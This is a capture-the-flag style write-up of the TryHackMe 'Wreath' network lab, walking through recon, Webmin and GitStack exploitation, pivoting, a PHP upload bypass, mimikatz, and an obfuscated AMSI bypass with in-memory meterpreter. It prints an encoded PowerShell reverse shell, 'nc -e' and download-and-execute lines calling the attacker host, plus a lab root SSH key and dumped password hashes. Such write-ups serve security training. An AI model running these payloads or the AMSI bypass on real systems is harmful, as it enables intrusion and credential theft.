# Wreath
https://tryhackme.com/room/wreath | 10.200.81.200 | 2022-05-17


## Initial Machine Recon
```
┌──(kali㉿kali)-[~/Desktop]                                              
└─$ rustscan -a $IP --ulimit 5000 -- -sVC                                                                                                         
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.                                                                                          
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |          
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'            
The Modern Day Port Scanner.                                                                                                                      
________________________________________                                                                                                          
: https://discord.gg/GFrQsGy           :                                 
: https://github.com/RustScan/RustScan :                                 
 --------------------------------------                       
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan
                                                                                                                                                  
[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.                                                                                                
Open 10.200.81.200:22    (OpenSSH 8.0 (protocol 2.0))
Open 10.200.81.200:80    (Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c))                    
Open 10.200.81.200:443   (Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c))                                        
Open 10.200.81.200:10000 (MiniServ 1.890 (Webmin httpd))
```

Additional nmap info that might be relevant:
```
Did not follow redirect to https://thomaswreath.thm

| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=
GB/emailAddress=me@thomaswreath.thm/localityName=Easingwold   
| Issuer: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB/emailAdd
ress=me@thomaswreath.thm/localityName=Easingwold
```

- Port 10000 has a vulnerable software - CVE-2019-15107
- Exploited it with https://github.com/MuirlandOracle/CVE-2019-15107

## Pivoting
For easier connection to the compromised machine, I took the ssh key from `/root/.ssh/id_rsa`

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

```

After getting a stable connection I uploaded a static binary of nmap to scan the internal network.
```
[root@prod-serv shm]# ./nmap -sn 10.200.81.0/24

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-05-17 10:42 BST
Cannot find nmap-payloads. UDP payloads are disabled.
Nmap scan report for ip-10-200-81-1.eu-west-1.compute.internal (10.200.81.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.15s latency).
MAC Address: 02:8C:E0:55:7B:89 (Unknown)
Nmap scan report for ip-10-200-81-100.eu-west-1.compute.internal (10.200.81.100)
Host is up (0.00024s latency).
MAC Address: 02:CF:8B:75:42:9D (Unknown)
(10.200.81.150)
Host is up (0.00024s latency).
MAC Address: 02:6B:02:7E:9C:05 (Unknown)
(10.200.81.250)
Host is up (0.00024s latency).
MAC Address: 02:E7:4E:C8:80:A7 (Unknown)
(10.200.81.200)
Host is up.
```

So the new machines I found in the private network are:
- 10.200.81.100 (Open ports: Filtered)
-  10.200.81.150 (Open ports: 80, 3389, 5357, 5985, might be more)

Now, to access them I initiated a sshuttle connection.
```
sudo sshuttle -r root@thomaswreath.thm --ssh-cmd "ssh -i id_rsa" -x 10.200.81.200 10.200.81.0/24
```

## Second Web-Server
In the internal network on 10.200.81.150 there appears to be a web-server running GitStack.
Looking this up on searchsploit, I found a python script that should give me RCE (php/webapps/43777.py)
However whilst using the RCE, I couldn't make a callback to my machine, so I had to relay the connection via the previously compromised server.

I started by setting up a firewall rule on the compromised server to allow inbound connections a chosen port.
`firewall-cmd --zone=public --add-port 17000/tcp`

Then I uploaded a socat binary and setup a relay, so any connection to the compromised machine on port 17,000 would redirect the connection to a netcat listen I set up on port 4444 in my machine. 
`./socat tcp-l:17000,fork,reuseaddr tcp:10.50.82.129:4444`

Then to wrap it all up, I created a powershell reverse-shell script via revshells.com to connect to 10.200.81.200:17000 and URL-encoded it.
```
powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMgAwADAALgA4ADEALgAyADAAMAAiACwAMQA3ADAAMAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA%3D%3D
```
And that gave me a connection on my nc listener on my machine.

The next step to fully compromise this new machine, is to get access to its RDP.
Since previous enumeration found that RDP service is already running on the machine, all I have to do is create a new user with my new shell and login with it via RDP.
```
nt authority\system
PS C:\GitStack\gitphp> net user root password /add    
The command completed successfully.

PS C:\GitStack\gitphp> net localgroup Administrators root /add
The command completed successfully.

PS C:\GitStack\gitphp> net localgroup "Remote Management Users" root /add
The command completed successfully.
```
Newly created user: `root:password`.

## Post Exploitation Second Machine
Now that we've compromised the second machine, I can try uploading mimikatz to further enumerate the target.
I first made sure windows defender wasn't running, then I uploaded a mimikatz binary.
```
privilege::debug
token::elevate
lsadump::sam

User : Administrator
  Hash NTLM: 37db630168e5f82aafa8461e05c6bbd1 (Unkown)
User : Thomas
  Hash NTLM: 02d90eda8f6b6b06c32d5f207831101f (i<3ruby)
```

I then used a powershell script from powershell-empire (Invoke-Portscan.ps1) to scan the last computer on the network.
```
Hostname      : 10.200.81.100
alive         : True
openPorts     : {80, 3389}
closedPorts   : {}
filteredPorts : {445, 443, 110, 21...}
finishTime    : 5/17/2022 2:33:55 PM
```

Then to access that computer I decided to use chisel. But first, like last time, to allow access to that computer I'll need a way to relay the traffic.
I started by allowing inbound connections on port 18,000 on the second compromised machine.
```
netsh advfirewall firewall add rule name="Chisel-A" dir=in action=allow protocol=tcp localport=18000
```
Followed by an upload and execution of chisel.

Server-Side (Compromised server 2):
```
./chisel server -p 18000 --socks5
```

Client-Side: (My Machine):
```
chisel client 10.200.81.150:18000 1080:socks
```

After the connection is up and running. I opened foxyproxy to use socks5 on port 1080, like I specified above, and now I can access the internal server of the server ending with `.100`.

## Third Web-Server
Now with Chisel, I have access to the internal server on http://10.200.81.100/
From simple manual enumeration, the "404 Not Found" page revealed that this webserver is running PHP/7.4.11 on Apache/2.4.46 (Win64).

Instead of enumerating the webserver, we know that it's probably in a Git server. Most likely in the GitSlack we found in the previous steps. Since we have access to the web-server, we can download the git repository to go over it locally without the GitSlack credentials.

After extracting the git repo with https://github.com/internetwache/GitTools
I found a php page at `/resources/index.php` which seems to be an image upload page. Before being able to view the page there's a basic http auth set-up.
Luckily the credentials of Thomas (`Thomas:i<3ruby`) we've found before work here.

Now all that's left is to exploit the logic behind this upload page to upload a reverse shell. This can be easily done by looking at the source code we extracted before.

What I've done was I took a pre-existing image to bypass the exif-check, then I appended a simple 1 liner php shell, and renamed the file to end with `.png.php` to bypass the end check.

Then to access it I go to `/resources/uploads/logo.png.php?cmd=whoami`. The output is a bit iffy because of all the image data, but it works!

Using `ping 10.50.82.129` and `tcpdump` I determined that with my current relays the machine can directly contact me. This will make it easier to get a reverse shell.

Next, suggested by the network, I decided to upload nc to the machine. I've done so by getting a pre-compiled netcat file, and then hosting it via a python web-server.
Then I downloaded it via curl, and then running and catching it with a nc listener.
```
curl http://10.50.82.129/nc.exe -o nc-a.exe
nc-a.exe -e powershell 10.50.82.129 4444

┌──(kali㉿kali)-[/opt/tools/Cats/Windows]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.50.82.129] from (UNKNOWN) [10.200.81.100] 51032
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\xampp\htdocs\resources\uploads> whoami
whoami
wreath-pc\thomas
```

## Post Exploitation Third Machine
Now that I have powershell shell access to the machine, I can upload a better reverse shell than a netcat one.

Knowing that the target PC has an AV installed, I decided to try and get a meterpreter shell anyway. So decided to bypass AMSI then executing the meterpreter stagger in memory.

My Machine:
```
// Create a powershell payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun1 LPORT=1234 -f psh > shell-a.ps1

// Start a metasploit listener for the meterpreter
msfconsole -q
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST tun1
set LPORT 1234
exploit

// Start a web-server so the target can download the payload
python3 -m http.server 80
```

Target Machine:
```
// AMSI Bypass - Matt Graeber - Obfuscated using Invoke-Obfuscation.
&("{0}{1}{3}{2}"-f's','e','E',("{1}{2}{0}" -f'Bl','T-','VArIa')) ("n"+("{1}{0}"-f '1','h4b')) ([TyPE]("{1}{0}"-f'F','re') ) ;  (  .("{0}{1}{2}" -f("{2}{3}{1}{0}"-f'Ab','ari','get','-V'),'l','e') ("N"+("{1}{0}"-f '1','h4B'))  -vALueO)."AssemB`LY".("{2}{0}{1}" -f't',("{1}{0}"-f'e','Typ'),'Ge')."INvo`ke"(("{4}{9}{6}{3}{2}{1}{8}{7}{0}{5}" -f("{1}{0}" -f 'Ut','msi'),'oma','ut',("{2}{0}{1}"-f'ment.','A','ge'),'S','ils','ana','A',("{0}{1}"-f'tio','n.'),("{0}{1}"-f'yst','em.M'))).("{1}{0}" -f'ld',("{0}{1}{2}" -f 'G','etF','ie'))."Inv`oKe"(("{1}{4}{0}{2}{3}"-f ("{0}{1}{2}" -f'Init','F','a'),'ams','ile','d','i'),("{4}{2}{1}{0}{3}"-f ',','ic','l',("{0}{1}"-f 'S','tatic'),("{1}{0}"-f 'nPub','No'))).("{1}{0}"-f 'lue',("{0}{1}"-f 'Set','Va'))."i`Nv`Oke"(${Nu`Ll},${tr`Ue});

// Download and execute in memory the meterpreter payload.
iex (New-Object Net.WebClient).DownloadString('http://10.50.82.129/shell-a.ps1');
```

After a few tweaking I ended up with the code above and it worked :)

Then for the privesc I simply used `getsystem` via meterpreter, which ended up using a variant of PrintSpooler for privesc.
Note: It's also possible to achieve normal privesc by exploiting SystemExplorerHelpService on the machine (https://www.exploit-db.com/exploits/49248)

And that's it. The network is fully compromised.
Overall, this was a really fun and simple network :)
